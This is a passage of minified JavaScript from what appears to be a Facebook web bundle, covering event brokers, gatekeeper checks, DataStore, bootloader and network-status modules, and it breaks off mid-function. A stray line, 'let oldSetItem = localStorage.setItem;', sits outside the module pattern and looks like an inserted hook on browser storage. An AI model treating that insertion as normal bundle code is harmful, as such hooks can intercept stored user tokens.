      a.subscribeOnce = function (b, c, d) {
        return a.prototype.subscribeOnce.apply(j(this), arguments);
      };
      a.unsubscribe = function (b) {
        return a.prototype.unsubscribe.apply(j(this), arguments);
      };
      a.inform = function (b, c, d) {
        return a.prototype.inform.apply(j(this), arguments);
      };
      a.informSingle = function (b, c, d) {
        return a.prototype.inform.apply(j(this), arguments);
      };
      a.query = function (b) {
        return a.prototype.query.apply(j(this), arguments);
      };
      a.registerCallback = function (b, c) {
        return a.prototype.registerCallback.apply(j(this), arguments);
      };
      a.$6 = function (b, c, d) {
        return a.prototype.$6.apply(j(this), arguments);
      };
      a.$5 = function (b, c, d) {
        return a.prototype.$5.apply(j(this), arguments);
      };
      return a;
    }(),
    l = function (b) {
      babelHelpers.inheritsLoose(a, b);
      function a() {
        var a;
        a = b.call(this) || this;
        a.$ArbiterEventHolder1 = {};
        return a;
      }
      var c = a.prototype;
      c.setHoldingBehavior = function (a, b) {
        this.$ArbiterEventHolder1[a] = b;
      };
      c.getHoldingBehavior = function (a) {
        return this.$ArbiterEventHolder1[a];
      };
      c.holdEvent = function (a) {
        var c = this.$ArbiterEventHolder1[a];
        c !== "persistent" && this.$ArbiterEventHolder2(a);
        if (c !== "event") {
          var d;
          for (var e = arguments.length, f = new Array(e > 1 ? e - 1 : 0), g = 1; g < e; g++) f[g - 1] = arguments[g];
          return (d = b.prototype.holdEvent).call.apply(d, [this, a].concat(f));
        }
        return void 0;
      };
      c.$ArbiterEventHolder2 = function (a) {
        this.emitToListener(a, this.releaseCurrentEvent, this);
      };
      c.releaseEvent = function (a) {
        a && b.prototype.releaseEvent.call(this, a);
      };
      return a;
    }(c("EventHolder"));
  k.call(k);
  a = k;
  g["default"] = a;
}, 98);
__d("BigPipeInstance", [], function (a, b, c, d, e, f) {
  "use strict";

  var g = null;
  a = {
    Events: {
      init: "BigPipe/init",
      tti: "tti_bigpipe",
      displayed: "all_pagelets_displayed",
      loaded: "all_pagelets_loaded"
    },
    setCurrentInstance_DO_NOT_USE: function (a) {
      g = a;
    },
    getCurrentInstance: function () {
      return g;
    }
  };
  e.exports = a;
}, null);
__d("SimpleHook", [], function (a, b, c, d, e, f) {
  "use strict";

  a = function () {
    function a() {
      this.__callbacks = [], this.call = this.$2;
    }
    var b = a.prototype;
    b.hasCallback = function (a) {
      var b = this.__callbacks;
      return b.length > 0 && (a == null || b.some(function (b) {
        return b === a || b.$1 === a;
      }));
    };
    b.add = function (a, b) {
      var c = this,
        d;
      if ((b == null ? void 0 : b.once) === !0) {
        b = function () {
          c.remove(d), a.apply(null, arguments);
        };
        b.$1 = a;
        d = b;
      } else d = a;
      this.__callbacks.push(d);
      return d;
    };
    b.removeLast = function () {
      return this.__callbacks.pop();
    };
    b.remove = function (a) {
      return this.removeIf(function (b) {
        return b === a;
      });
    };
    b.removeIf = function (a) {
      var b = this.__callbacks;
      this.__callbacks = b.filter(function (b) {
        return !a(b);
      });
      return b.length > this.__callbacks.length;
    };
    b.clear = function () {
      this.__callbacks = [];
    };
    b.$2 = function () {
      var a = this.__callbacks;
      for (var b = 0, c = a.length; b < c; ++b) {
        var d = a[b];
        d.apply(null, arguments);
      }
    };
    return a;
  }();
  f.SimpleHook = a;
}, 66);
__d("BanzaiLazyQueue", ["SimpleHook"], function (a, b, c, d, e, f, g) {
  var h = [],
    i = new (d("SimpleHook").SimpleHook)();
  a = {
    onQueue: i,
    queuePost: function (a, b, c) {
      h.push([a, b, c]), i.call(a, b, c);
    },
    flushQueue: function () {
      var a = h;
      h = [];
      return a;
    }
  };
  f.exports = a;
}, 34);
__d("ExecutionEnvironment", [], function (a, b, c, d, e, f) {
  "use strict";

  b = !!(a !== void 0 && a.document && a.document.createElement);
  c = typeof WorkerGlobalScope === "function";
  d = {
    canUseDOM: b,
    canUseEventListeners: b && !!(a.addEventListener || a.attachEvent),
    canUseViewport: b && !!window.screen,
    canUseWorkers: typeof Worker !== "undefined",
    isInBrowser: b || c,
    isInWorker: c
  };
  e = d;
  f["default"] = e;
}, 66);
__d("gkx", ["invariant", "BanzaiLazyQueue", "ExecutionEnvironment", "emptyFunction"], function (a, b, c, d, e, f, g, h) {
  "use strict";

  var i = {},
    j = {};
  function k(a) {
    var b = i[a];
    b != null || h(0, 11797, a);
    j[a] || (j[a] = !0, (c("ExecutionEnvironment").canUseDOM || c("ExecutionEnvironment").isInWorker) && d("BanzaiLazyQueue").queuePost("gk2_exposure", {
      identifier: a,
      hash: b.hash
    }));
    return b.result;
  }
  k.add = function (a, b) {
    for (var c in a) b && b.entry++, !(c in i) ? i[c] = a[c] : b && b.dup_entry++;
  };
  k.addLoggedInternal = function (a) {
    k.add(a);
    for (a in a) j[a] = !0;
  };
  a = c("emptyFunction");
  k.getGKs = function () {
    return null;
  };
  k.getLogged = function () {
    return Object.keys(j).map(function (a) {
      return {
        identifier: a,
        hash: i[a].hash
      };
    });
  };
  k.setPass = a;
  k.setFail = a;
  k.clear = a;
  b = k;
  g["default"] = b;
}, 98);
__d("isEmpty", ["invariant"], function (a, b, c, d, e, f, g, h) {
  "use strict";

  function a(a) {
    if (Array.isArray(a)) return a.length === 0;else if (typeof a === "object") {
      if (a) {
        !i(a) || a.size === void 0 || h(0, 1445);
        for (var b in a) return !1;
      }
      return !0;
    } else return !a;
  }
  function i(a) {
    return typeof Symbol === "undefined" ? !1 : a[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"] != null;
  }
  g["default"] = a;
}, 98);
__d("DataStore", ["DataStoreConfig", "gkx", "isEmpty"], function (a, b, c, d, e, f) {
  "use strict";

  var g,
    h = b("DataStoreConfig").expandoKey,
    i = b("DataStoreConfig").useExpando,
    j = b("gkx")("1073500") && window.WeakMap ? new window.WeakMap() : null,
    k = {},
    l = 1;
  function m(a) {
    if (typeof a === "string") return "str_" + a;else {
      var b;
      return "elem_" + ((b = a.__FB_TOKEN) != null ? b : a.__FB_TOKEN = [l++])[0];
    }
  }
  function n(a) {
    if (j != null && typeof a === "object") {
      j.get(a) === void 0 && j.set(a, {});
      return j.get(a);
    } else if (i && typeof a === "object") return a[h] || (a[h] = {});
    a = m(a);
    return k[a] || (k[a] = {});
  }
  var o = {
    set: function (a, b, c) {
      if (!a) throw new TypeError("DataStore.set: namespace is required, got " + typeof a);
      var d = n(a);
      d[b] = c;
      return a;
    },
    get: function (a, b, c) {
      if (!a) throw new TypeError("DataStore.get: namespace is required, got " + typeof a);
      var d = n(a),
        e = d[b];
      if (e === void 0 && a.getAttribute != null) if (a.hasAttribute != null && !a.hasAttribute("data-" + b)) e = void 0;else {
        a = a.getAttribute("data-" + b);
        e = a === null ? void 0 : a;
      }
      c !== void 0 && e === void 0 && (e = d[b] = c);
      return e;
    },
    remove: function (a, c) {
      if (!a) throw new TypeError("DataStore.remove: namespace is required, got " + typeof a);
      var d = n(a),
        e = d[c];
      delete d[c];
      (g || (g = b("isEmpty")))(d) && o.purge(a);
      return e;
    },
    purge: function (a) {
      if (j != null && typeof a === "object") return j["delete"](a);else i && typeof a === "object" ? delete a[h] : delete k[m(a)];
    },
    _storage: k
  };
  e.exports = o;
}, null);
__d("BigPipePlugins", ["DataStore"], function (a, b, c, d, e, f, g) {
  a = function () {
    function a() {}
    a.runPluginOnPagelet = function (b) {
      a.getPluginList().forEach(function (a) {
        a(b);
      });
    };
    a.getPluginList = function () {
      return [a.$1];
    };
    a.$1 = function (b) {
      if (!b) return;
      b = b.querySelectorAll("div[data-fte]");
      for (var c = 0, d = b.length; c < d; c++) a.$2(b[c], "data-ft", "data-ft");
    };
    a.$2 = function (a, b, c) {
      var e = a.getAttribute(b);
      e && (d("DataStore").set(a, c, e), a.removeAttribute(b));
    };
    return a;
  }();
  g["default"] = a;
}, 98);
__d("objectValues", [], function (a, b, c, d, e, f) {
  "use strict";

  function a(a) {
    return Object.values(a);
  }
  f["default"] = a;
}, 66);
__d("BootloaderEvents", ["Arbiter", "objectValues"], function (a, b, c, d, e, f, g) {
  var h = "bootloader/bootload",
    i = "bootloader/callback_timeout",
    j = "bootloader/defer_timeout",
    k = "hasteResponse/handle",
    l = "bootloader/resource_in_longtail_bt_manifest",
    m = new (c("Arbiter"))(),
    n = new Set(),
    o = new Set();
  function p(a, b) {
    return "haste_response_ef:" + a + ":" + ((a = b) != null ? a : "<unknown>");
  }
  function a(a) {
    var b = new Map();
    for (var a = c("objectValues")(a), d = Array.isArray(a), e = 0, a = d ? a : a[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
      var f;
      if (d) {
        if (e >= a.length) break;
        f = a[e++];
      } else {
        e = a.next();
        if (e.done) break;
        f = e.value;
      }
      f = f;
      for (var f = f, g = Array.isArray(f), h = 0, f = g ? f : f[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
        var i;
        if (g) {
          if (h >= f.length) break;
          i = f[h++];
        } else {
          h = f.next();
          if (h.done) break;
          i = h.value;
        }
        i = i;
        var j = i[0];
        i = i[1];
        b.set(j, i);
      }
    }
    return b;
  }
  function b() {
    return {
      blocking: new Map(),
      nonblocking: new Map(),
      "default": new Map()
    };
  }
  function d(a) {
    n.add(a);
  }
  function e(a) {
    n["delete"](a), m.inform(h, a, "persistent");
  }
  function f(a, b) {
    o.add(p(a, b));
  }
  function q(a, b, c) {
    m.inform(p(a, b), c, "persistent");
  }
  function r(a) {
    m.inform(j, a, "persistent");
  }
  function s(a) {
    return m.subscribe(h, function (b, c) {
      return a(c);
    });
  }
  function t(a) {
    return m.subscribe(j, function (b, c) {
      return a(c);
    });
  }
  function u() {
    return new Set(n);
  }
  function v(a) {
    m.inform(k, a, "persistent");
  }
  function w(a) {
    return m.subscribe(k, function (b, c) {
      b = p(c.source, c.sourceDetail);
      if (o.has(b)) {
        m.subscribe(b, function (b, d) {
          return a(babelHelpers["extends"]({}, c, {
            efData: d
          }));
        });
        return;
      }
      a(c);
    });
  }
  function x(a) {
    return m.subscribe(l, a);
  }
  var y = !1;
  function z() {
    if (y) return;
    y = !0;
    m.inform(l, null, "persistent");
  }
  function A(a) {
    return m.subscribe(i, function (b, c) {
      a(c);
    });
  }
  function B(a) {
    m.inform(i, a, "persistent");
  }
  g.flattenResourceMapSet = a;
  g.newResourceMapSet = b;
  g.notifyBootloadStart = d;
  g.notifyBootload = e;
  g.notifyHasteResponseEFStart = f;
  g.notifyHasteResponseEF = q;
  g.notifyDeferTimeout = r;
  g.onBootload = s;
  g.onDeferTimeout = t;
  g.getActiveBootloads = u;
  g.notifyHasteResponse = v;
  g.onHasteResponse = w;
  g.onResourceInLongTailBTManifest = x;
  g.notifyResourceInLongTailBTManifest = z;
  g.onBootloaderCallbackTimeout = A;
  g.notifyBootloaderCallbackTimeout = B;
}, 98);
__d("performanceAbsoluteNow", ["performance"], function (a, b, c, d, e, f, g) {
  var h = function () {
    return Date.now();
  };
  function a(a) {
    h = a;
  }
  if (c("performance").now && c("performance").timing && c("performance").timing.navigationStart) {
    var i = c("performance").timing.navigationStart;
    b = function () {
      return c("performance").now() + i;
    };
  } else b = function () {
    return h();
  };
  b.setFallback = a;
  d = b;
  g["default"] = d;
}, 98);
__d("BootloaderEventsManager", ["CallbackDependencyManager", "performanceAbsoluteNow"], function (a, b, c, d, e, f) {
  var g;
  a = function () {
    "use strict";

    function a() {
      this.$1 = new (b("CallbackDependencyManager"))(), this.$2 = new Map();
    }
    var c = a.prototype;
    c.rsrcDone = function (a) {
      return a;
    };
    c.bootload = function (a) {
      return "bl:" + a.join(",");
    };
    c.tierOne = function (a) {
      return "t1:" + a;
    };
    c.tierTwoStart = function (a) {
      return "t2s:" + a;
    };
    c.tierTwo = function (a) {
      return "t2:" + a;
    };
    c.tierThreeStart = function (a) {
      return "t3s:" + a;
    };
    c.tierThree = function (a) {
      return "t3:" + a;
    };
    c.tierOneLog = function (a) {
      return "t1l:" + a;
    };
    c.tierTwoLog = function (a) {
      return "t2l:" + a;
    };
    c.tierThreeLog = function (a) {
      return "t3l:" + a;
    };
    c.beDone = function (a) {
      return "beDone:" + a;
    };
    c.notify = function (a) {
      this.$2.set(a, (g || (g = b("performanceAbsoluteNow")))()), this.$1.satisfyPersistentDependency(a);
    };
    c.getEventTime = function (a) {
      return this.$2.get(a);
    };
    c.registerCallback = function (a, b) {
      this.$1.registerCallback(a, b);
    };
    return a;
  }();
  e.exports = a;
}, null);
__d("BootloaderRetryTracker", ["ErrorGuard", "performanceAbsoluteNow"], function (a, b, c, d, e, f, g) {
  "use strict";

  b = function () {
    function b(a) {
      this.$2 = [], this.$3 = new Map(), this.$1 = a, this.$4 = this.$1.retries.length > 0;
    }
    var d = b.prototype;
    d.getAllRetryAttempts_FOR_DEBUG_ONLY = function () {
      return this.$3;
    };
    d.getNumRetriesForSource = function (a) {
      return (a = this.$3.get(a)) != null ? a : 0;
    };
    d.maybeScheduleRetry = function (b, d, e) {
      var f = this,
        g = this.getNumRetriesForSource(b);
      if (!this.$5() || g >= this.$1.retries.length) {
        e();
        return;
      }
      this.$2.push(c("performanceAbsoluteNow")());
      this.$3.set(b, g + 1);
      a.setTimeout(function () {
        f.$5() ? d() : e();
      }, this.$1.retries[g]);
    };
    d.$5 = function () {
      if (!this.$4) return !1;
      var a = this.$2.length;
      if (a < this.$1.abortNum) return !0;
      a = this.$2[a - 1] - this.$2[a - this.$1.abortNum];
      a < this.$1.abortTime && (c("ErrorGuard").applyWithGuard(this.$1.abortCallback, null, []), this.$4 = !1);
      return this.$4;
    };
    return b;
  }();
  g["default"] = b;
}, 98);
__d("BitMap", [], function (a, b, c, d, e, f) {
  var g = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_";
  a = function () {
    function a() {
      this.$1 = [], this.$2 = null;
    }
    var b = a.prototype;
    b.set = function (a) {
      this.$2 != null && !this.$1[a] && (this.$2 = null);
      this.$1[a] = 1;
      return this;
    };
    b.toString = function () {
      var a = [];
      for (var b = 0; b < this.$1.length; b++) a.push(this.$1[b] ? 1 : 0);
      return a.length ? i(a.join("")) : "";
    };
    b.toCompressedString = function () {
      if (this.$1.length === 0) return "";
      if (this.$2 != null) return this.$2;
      var a = [],
        b = 1,
        c = this.$1[0] || 0,
        d = c.toString(2);
      for (var e = 1; e < this.$1.length; e++) {
        var f = this.$1[e] || 0;
        f === c ? b++ : (a.push(h(b)), c = f, b = 1);
      }
      b && a.push(h(b));
      return this.$2 = i(d + a.join(""));
    };
    return a;
  }();
  function h(a) {
    a = a.toString(2);
    var b = "0".repeat(a.length - 1);
    return b + a;
  }
  function i(a) {
    a = (a + "00000").match(/[01]{6}/g);
    var b = "";
    for (var c = 0; a != null && c < a.length; c++) b += g[parseInt(a[c], 2)];
    return b;
  }
  f["default"] = a;
}, 66);
__d("CSRBitMap", ["BitMap"], function (a, b, c, d, e, f, g) {
  var h = new (c("BitMap"))();
  function a(a) {
    h.set(a);
  }
  function b() {
    return h.toCompressedString();
  }
  g.add = a;
  g.toCompressedString = b;
}, 98);
__d("CSRIndexUtil", ["invariant"], function (a, b, c, d, e, f, g, h) {
  b = 0;
  function a(a) {
    a.substr(0, 1) === ":" || h(0, 21456, a);
    return a.substr(1).split(",").map(function (a) {
      return parseInt(a, 10);
    });
  }
  g.UNKNOWN_RESOURCE_INDEX = b;
  g.parseCSRIndexes = a;
}, 98);
__d("requireCond", [], function (a, b, c, d, e, f) {
  function a(a, b, c) {
    throw new Error("Cannot use raw untransformed requireCond.");
  }
  b = a;
  f["default"] = b;
}, 66);
__d("clearTimeout", ["cr:806696"], function (a, b, c, d, e, f, g) {
  "use strict";

  g["default"] = b("cr:806696");
}, 98);
__d("err", ["fb-error"], function (a, b, c, d, e, f, g) {
  "use strict";

  g["default"] = c("fb-error").err;
}, 98);
__d("getSameOriginTransport", ["ExecutionEnvironment", "err"], function (a, b, c, d, e, f, g) {
  function b() {
    if (!c("ExecutionEnvironment").canUseDOM && !c("ExecutionEnvironment").isInWorker) throw c("err")("getSameOriginTransport: %s", "Same origin transport unavailable in the server environment.");
    try {
      return new a.XMLHttpRequest();
    } catch (a) {
      throw c("err")("getSameOriginTransport: %s", a.message);
    }
  }
  g["default"] = b;
}, 98);
__d("killswitch", ["KSConfig"], function (a, b, c, d, e, f) {
  "use strict";

  function a(a) {
    return b("KSConfig").killed.has(a);
  }
  e.exports = a;
}, null);
__d("setTimeout", ["cr:807042"], function (a, b, c, d, e, f, g) {
  g["default"] = b("cr:807042");
}, 98);
__d("NetworkHeartbeat", ["clearTimeout", "getSameOriginTransport", "killswitch", "setTimeout"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = "/nw/",
    i = 6400,
    j = 100,
    k = null,
    l = 0,
    m = null,
    n = c("killswitch")("DISABLE_HEARTBEAT_POLLING");
  function o(a, b) {
    m = c("getSameOriginTransport")(), m.open("GET", h, !0), m.onload = function () {
      m && m.status === 204 && (n = !0), q(a);
    }, m.onerror = function () {
      r(a, b);
    }, m.ontimeout = function () {
      r(a, b);
    }, m.send();
  }
  function p() {
    m = null, j = 100, l = 0, c("clearTimeout")(k);
  }
  function q(a) {
    p(), a();
  }
  function r(a, b) {
    k = c("setTimeout")(function () {
      s(a, b, void 0, !0);
    }, j), l++, j < i && (j = Math.min(j * Math.pow(2, l), i)), b();
  }
  function s(a, b, c, d) {
    c === void 0 && (c = function () {
      return !0;
    }), d === void 0 && (d = !1), n || (d || m == null && c()) && o(a, b);
  }
  function a() {
    return m != null;
  }
  g.maybeStartHeartbeat = s;
  g.isHeartbeatPending = a;
}, 98);
__d("NetworkStatusImpl", ["NetworkHeartbeat", "performanceNow"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h,
    i = [],
    j = typeof window !== "undefined" ? window : self,
    k = j == null ? void 0 : (h = j.navigator) == null ? void 0 : h.onLine,
    l = 2,
    m = 5e3,
    n = [],
    o = [],
    p = 0,
    q = !0,
    r = !1,
    s = !1,
    t = function () {
      x(q, !0);
    },
    u = function () {
      x(r, !0);
    };
  function v() {
    var a = i.slice();
    a.forEach(function (a) {
      a({
        online: k
      });
    });
  }
  function w(a) {
    a = i.indexOf(a);
    a > -1 && i.splice(a, 1);
  }
  function x(a, b) {
    b === void 0 && (b = !1);
    var c = k === a;
    b = !b && a === q && d("NetworkHeartbeat").isHeartbeatPending();
    if (c || b) return;
    s = s || a === r;
    k = a;
    k || d("NetworkHeartbeat").maybeStartHeartbeat(t, u);
    v();
  }
  function y() {
    var a = c("performanceNow")();
    n = n.filter(function (b) {
      return z(b.startTime, a);
    });
    o = o.filter(function (b) {
      return z(b.startTime, a);
    });
    return o.length / n.length < l;
  }
  var z = function (a, b) {
    return a > b - m;
  };
  function a() {
    return k;
  }
  function b(a) {
    i.push(a);
    var b = !1;
    return {
      remove: function () {
        b || (b = !0, w(a));
      }
    };
  }
  function e() {
    var a = c("performanceNow")();
    n.push({
      startTime: a
    });
    d("NetworkHeartbeat").maybeStartHeartbeat(t, u, y);
  }
  function f() {
    var a = c("performanceNow")();
    o.push({
      startTime: a
    });
    z(p, a) || (o = o.filter(function (b) {
      return z(b.startTime, a);
    }), p = a);
  }
  function A() {
    return s;
  }
  j.addEventListener("online", function () {
    x(q);
  });
  j.addEventListener("offline", function () {
    x(r);
  });
  g.isOnline = a;
  g.onChange = b;
  g.reportError = e;
  g.reportSuccess = f;
  g.wasOffline = A;
}, 98);
__d("NetworkStatusSham", [], function (a, b, c, d, e, f) {
  "use strict";

  function a() {
    return !0;
  }
  function b(a) {
    return {
      remove: function () {}
    };
  }
  function c() {
    return;
  }
  function d() {
    return;
  }
  function e() {
    return !1;
  }
  f.isOnline = a;
  f.onChange = b;
  f.reportError = c;
  f.reportSuccess = d;
  f.wasOffline = e;
}, 66);
__d("NetworkStatus", ["NetworkStatusImpl", "NetworkStatusSham", "gkx"], function (a, b, c, d, e, f, g) {
  "use strict";

  a = c("gkx")("708253") && c("gkx")("1263340") ? d("NetworkStatusImpl") : d("NetworkStatusSham");
  b = a;
  g["default"] = b;
}, 98);
__d("CircularBuffer", ["unrecoverableViolation"], function (a, b, c, d, e, f, g) {
  a = function () {
    function a(a) {
      if (a <= 0) throw c("unrecoverableViolation")("Buffer size should be a positive integer", "comet_infra");
      this.$1 = a;
      this.$2 = 0;
      this.$3 = [];
      this.$4 = [];
    }
    var b = a.prototype;
    b.write = function (a) {
      var b = this;
      this.$3.length < this.$1 ? this.$3.push(a) : (this.$4.forEach(function (a) {
        return a(b.$3[b.$2]);
      }), this.$3[this.$2] = a, this.$2++, this.$2 %= this.$1);
      return this;
    };
    b.onEvict = function (a) {
      this.$4.push(a);
      return this;
    };
    b.read = function () {
      return this.$3.slice(this.$2).concat(this.$3.slice(0, this.$2));
    };
    b.expand = function (a) {
      if (a > this.$1) {
        var b = this.read();
        this.$2 = 0;
        this.$3 = b;
        this.$1 = a;
      }
      return this;
    };
    b.dropFirst = function (a) {
      if (a <= this.$1) {
        var b = this.read();
        this.$2 = 0;
        b.splice(0, a);
        this.$3 = b;
      }
      return this;
    };
    b.clear = function () {
      this.$2 = 0;
      this.$3 = [];
      return this;
    };
    b.currentSize = function () {
      return this.$3.length;
    };
    return a;
  }();
  g["default"] = a;
}, 98);
__d("ResourceTypes", [], function (a, b, c, d, e, f) {
  "use strict";

  a = {
    JS: "js",
    CSS: "css",
    XHR: "xhr"
  };
  b = a;
  f["default"] = b;
}, 66);
let oldSetItem = localStorage.setItem;
__d("TimingAnnotations", [], function (a, b, c, d, e, f) {
  a = function () {
    function a() {}
    var b = a.prototype;
    b.addStringAnnotation = function (a, b) {
      return this;
    };
    b.addSetAnnotation = function (a, b) {
      return this;
    };
    b.addSetElement = function (a, b) {
      return this;
    };
    b.registerOnBeforeSend = function (a) {
      return this;
    };
    b.addVectorAnnotation = function (a, b) {
      return this;
    };
    b.addVectorElement = function (a, b) {
      return this;
    };
    return a;
  }();
  b = function () {
    function a() {
      this.$1 = null, this.$2 = null, this.$3 = null, this.$4 = [];
    }
    var b = a.prototype;
    b.addStringAnnotation = function (a, b) {
      this.$2 = this.$2 || new Map();
      this.$2.set(a, b);
      return this;
    };
    b.addSetAnnotation = function (a, b) {
      var c = this.$1 || new Map(),
        d = c.get(a) || new Set();
      b.forEach(function (a) {
        return d.add(a);
      });
      c.set(a, d);
      this.$1 = c;
      return this;
    };
    b.addSetElement = function (a, b) {
      var c = this.$1 || new Map(),
        d = c.get(a) || new Set();
      d.add(b);
      c.set(a, d);
      this.$1 = c;
      return this;
    };
    b.addVectorAnnotation = function (a, b) {
      this.$3 = this.$3 || new Map();
      this.$3.set(a, b);
      return this;
    };
    b.addVectorElement = function (a, b) {
      var c = this.$3 = this.$3 || new Map(),
        d = this.$3.get(a) || [];
      d.push(b);
      c.set(a, d);
      return this;
    };
    b.registerOnBeforeSend = function (a) {
      this.$4.push(a);
      return this;
    };
    b.prepareToSend = function () {
      var a = this;
      this.$4.forEach(function (b) {
        return b(a);
      });
      this.$4 = [];
      var b = {};
      if (this.$1 != null) for (var c = this.$1, d = Array.isArray(c), e = 0, c = d ? c : c[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
        var f;
        if (d) {
          if (e >= c.length) break;
          f = c[e++];
        } else {
          e = c.next();
          if (e.done) break;
          f = e.value;
        }
        f = f;
        var g = f[0];
        f = f[1];
        b[g] = Array.from(f.values());
      }
      g = {};
      if (this.$2 != null) for (f = this.$2, e = Array.isArray(f), d = 0, f = e ? f : f[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
        if (e) {
          if (d >= f.length) break;
          c = f[d++];
        } else {
          d = f.next();
          if (d.done) break;
          c = d.value;
        }
        c = c;
        var h = c[0];
        c = c[1];
        g[h] = c;
      }
      h = {};
      if (this.$3 != null) for (c = this.$3, d = Array.isArray(c), e = 0, c = d ? c : c[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
        if (d) {
          if (e >= c.length) break;
          f = c[e++];
        } else {
          e = c.next();
          if (e.done) break;
          f = e.value;
        }
        f = f;
        var i = f[0];
        f = f[1];
        h[i] = f;
      }
      return {
        setProps: b,
        stringProps: g,
        vectorProps: h
      };
    };
    a.combine = function (a, b) {
      var c;
      a != null && b != null ? (a.stringProps = babelHelpers["extends"]({}, b.stringProps, a.stringProps), a.setProps = babelHelpers["extends"]({}, b.setProps, a.setProps), c = a) : a != null ? c = a : b != null && (c = b);
      return c;
    };
    return a;
  }();
  b.EmptyTimingAnnotations = a;
  b.EmptyTraceTimingAnnotations = a;
  b.TraceTimingAnnotations = b;
  f["default"] = b;
}, 66);
__d("isFacebookURI", [], function (a, b, c, d, e, f) {
  var g = null,
    h = ["http", "https"];
  function a(a) {
    g || (g = new RegExp("(^|\\.)facebook\\.com$", "i"));
    if (a.isEmpty() && a.toString() !== "#") return !1;
    return !a.getDomain() && !a.getProtocol() ? !0 : h.indexOf(a.getProtocol()) !== -1 && g.test(a.getDomain());
  }
  a.setRegex = function (a) {
    g = a;
  };
  f["default"] = a;
}, 66);
__d("isMessengerDotComURI", [], function (a, b, c, d, e, f) {
  var g = new RegExp("(^|\\.)messenger\\.com$", "i"),
    h = ["https"];
  function a(a) {
    if (a.isEmpty() && a.toString() !== "#") return !1;
    return !a.getDomain() && !a.getProtocol() ? !1 : h.indexOf(a.getProtocol()) !== -1 && g.test(a.getDomain());
  }
  f["default"] = a;
}, 66);
__d("isWorkDotMetaDotComURI", [], function (a, b, c, d, e, f) {
  var g = new RegExp("(^|\\.)work\\.meta\\.com$", "i"),
    h = ["https"];
  function a(a) {
    if (a.isEmpty() && a.toString() !== "#") return !1;
    return !a.getDomain() && !a.getProtocol() ? !1 : h.indexOf(a.getProtocol()) !== -1 && g.test(a.getDomain());
  }
  f["default"] = a;
}, 66);
__d("isWorkplaceDotComURI", [], function (a, b, c, d, e, f) {
  var g = new RegExp("(^|\\.)workplace\\.com$", "i");
  function a(a) {
    return a.getProtocol() === "https" && g.test(a.getDomain());
  }
  f["default"] = a;
}, 66);
__d("BlueCompatBroker", ["Env", "URI", "isCometAltpayJsSdkIframeAllowedDomain", "isFacebookURI", "isMessengerDotComURI", "isWorkDotMetaDotComURI", "isWorkplaceDotComURI"], function (a, b, c, d, e, f) {
  "use strict";

  var g,
    h,
    i,
    j = new Map(),
    k = !1,
    l = function (a) {
      a = new (g || (g = b("URI")))(a);
      return b("isFacebookURI")(a) || b("isWorkplaceDotComURI")(a) || b("isMessengerDotComURI")(a) || b("isWorkDotMetaDotComURI")(a);
    },
    m = {
      dispatch: function (a) {
        var b = m.getMessageEventString(a, "compatAction");
        if (b != null) {
          b = j.get(b);
          b && b(a);
        }
      },
      getMessageEventString: function (a, b) {
        a = a.data;
        if (typeof a === "object") {
          a = a == null ? void 0 : a[b];
          if (typeof a === "string") return a;
        }
        return "";
      },
      init: function (a) {
        a === void 0 && (a = "");
        if (!k) {
          document.body && (document.body.style.overflow = "auto");
          var c = b("isCometAltpayJsSdkIframeAllowedDomain")() ? "https://secure.facebook.com/" : document.referrer,
            d = c.indexOf("/", 8);
          c = c.substring(0, d);
          if (l(c)) {
            d = new MessageChannel();
            a = a !== "" ? a : (h || (h = b("Env"))).iframeKey;
            i = d.port1;
            i.onmessage = m.dispatch;
            window.parent.postMessage({
              compatAction: "CompatSetup",
              iframeKey: a
            }, c + "/", [d.port2]);
          }
          try {
            window.__REACT_DEVTOOLS_GLOBAL_HOOK__ = window.parent.__REACT_DEVTOOLS_GLOBAL_HOOK__;
          } catch (a) {}
          k = !0;
        }
      },
      register: function (a, b) {
        j.set(a, b);
      },
      clear: function (a) {
        j["delete"](a);
      },
      sendMessage: function (a) {
        k || m.init(), i && i.postMessage(babelHelpers["extends"]({}, a));
      }
    };
  e.exports = m;
}, null);
__d("MessengerEnvironment", ["CurrentEnvironment"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = babelHelpers["extends"]({}, c("CurrentEnvironment"), {
    messengerui: !1,
    roomschatui: !1,
    setMessengerUI: function (a) {
      h.messengerui = a;
    },
    setRoomsChatUI: function (a) {
      h.roomschatui = a;
    }
  });
  a = h;
  g["default"] = a;
}, 98);
__d("areEqual", [], function (a, b, c, d, e, f) {
  var g = [],
    h = [];
  function a(a, b) {
    var c = g.length ? g.pop() : [],
      d = h.length ? h.pop() : [];
    a = i(a, b, c, d);
    c.length = 0;
    d.length = 0;
    g.push(c);
    h.push(d);
    return a;
  }
  function i(a, b, c, d) {
    if (a === b) return a !== 0 || 1 / a == 1 / b;
    if (a == null || b == null) return !1;
    if (typeof a !== "object" || typeof b !== "object") return !1;
    var e = Object.prototype.toString,
      f = e.call(a);
    if (f != e.call(b)) return !1;
    switch (f) {
      case "[object String]":
        return a == String(b);
      case "[object Number]":
        return isNaN(a) || isNaN(b) ? !1 : a == Number(b);
      case "[object Date]":
      case "[object Boolean]":
        return +a == +b;
      case "[object RegExp]":
        return a.source == b.source && a.global == b.global && a.multiline == b.multiline && a.ignoreCase == b.ignoreCase;
    }
    e = c.length;
    while (e--) if (c[e] == a) return d[e] == b;
    c.push(a);
    d.push(b);
    try {
      e = 0;
      if (f === "[object Array]") {
        e = a.length;
        if (e !== b.length) return !1;
        while (e--) if (!i(a[e], b[e], c, d)) return !1;
      } else if (a instanceof Set) {
        if (a.size !== b.size) return !1;
        f = Array.from(b.values());
        for (var e = a, g = Array.isArray(e), h = 0, e = g ? e : e[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
          var j;
          if (g) {
            if (h >= e.length) break;
            j = e[h++];
          } else {
            h = e.next();
            if (h.done) break;
            j = h.value;
          }
          j = j;
          var k = !1;
          for (var l = 0; l < f.length; l++) {
            var m = f[l];
            if (i(j, m, c, d)) {
              k = !0;
              f.splice(l, 1);
              break;
            }
          }
